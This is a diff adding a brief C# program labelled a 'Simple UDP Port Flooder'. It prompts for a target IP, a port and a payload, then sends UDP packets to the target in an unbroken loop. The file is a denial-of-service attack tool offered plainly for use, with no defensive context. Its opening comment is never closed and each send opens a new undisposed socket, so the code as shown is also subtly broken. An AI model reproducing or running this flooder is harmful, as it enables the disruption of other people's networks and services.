@@ -1,0 +1,55 @@
+/* Simple UDP Port Flooder
+ * -jwstes
+
+using System;
+using System.Text;
+using System.Net;
+using System.Net.Sockets;
+
+namespace udpDat
+{
+    class Program
+    {
+        static string text = "";
+        static IPAddress ipAddr = IPAddress.None;
+        static int port = 00;
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                Console.Write("Enter The IP: ");
+                ipAddr = IPAddress.Parse(Console.ReadLine());
+                Console.Write("To which Port: ");
+                port = int.Parse(Console.ReadLine());
+                Console.Write("Enter Packets: ");
+                text = Console.ReadLine();
+                int counter = 0;
+                while (SendData())
+                {
+                    counter++;
+                    Console.Write("{0} packets envoyés.", counter);
+                    Console.CursorLeft = 0;
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("error: " + e.Message);
+                System.Threading.Thread.Sleep(4500);
+            }
+        }
+
+        static bool SendData()
+        {
+            try
+            {
+                new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(Encoding.ASCII.GetBytes(text), new IPEndPoint(ipAddr, port));
+                return true;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+    }
+}
